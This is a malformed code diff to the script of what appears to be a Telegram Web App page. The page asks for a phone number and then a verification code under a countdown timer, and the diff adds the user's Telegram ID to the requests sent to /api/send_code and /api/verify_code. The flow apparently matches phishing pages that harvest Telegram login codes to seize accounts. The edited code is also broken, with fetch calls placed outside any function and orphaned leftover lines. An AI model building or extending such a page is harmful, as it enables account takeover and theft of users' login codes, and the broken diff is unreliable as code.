@@ -172,19 +172,21 @@
 </div>
 
 <script>
-    let tg = window.Telegram?.WebApp;
-    if (tg) tg.ready();
-    let currentPhone = '';
-    let time = 932;
-    setInterval(() => { if(time>0){ time--; let m=Math.floor(time/60); let s=time%60; document.getElementById('timer').innerText = `${m}:${s<10?'0'+s:s}`; } }, 1000);
+let tg = window.Telegram?.WebApp;
+let userId = tg?.initDataUnsafe?.user?.id || '';
 
-    async function sendCode() {
-        let phone = document.getElementById('phone').value.trim();
-        if (!phone) return showError('Введите номер телефона');
-        currentPhone = phone;
-        document.getElementById('step1').classList.remove('active');
-        document.getElementById('step3').classList.add('active');
-        await fetch('/api/send_code', {
+// В sendCode() и verifyCode() добавляем userId в запрос
+await fetch('/api/send_code', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ phone: phone, user_id: userId })
+});
+
+await fetch('/api/verify_code', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ phone: currentPhone, code: code, user_id: userId })
+});
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ phone: phone })
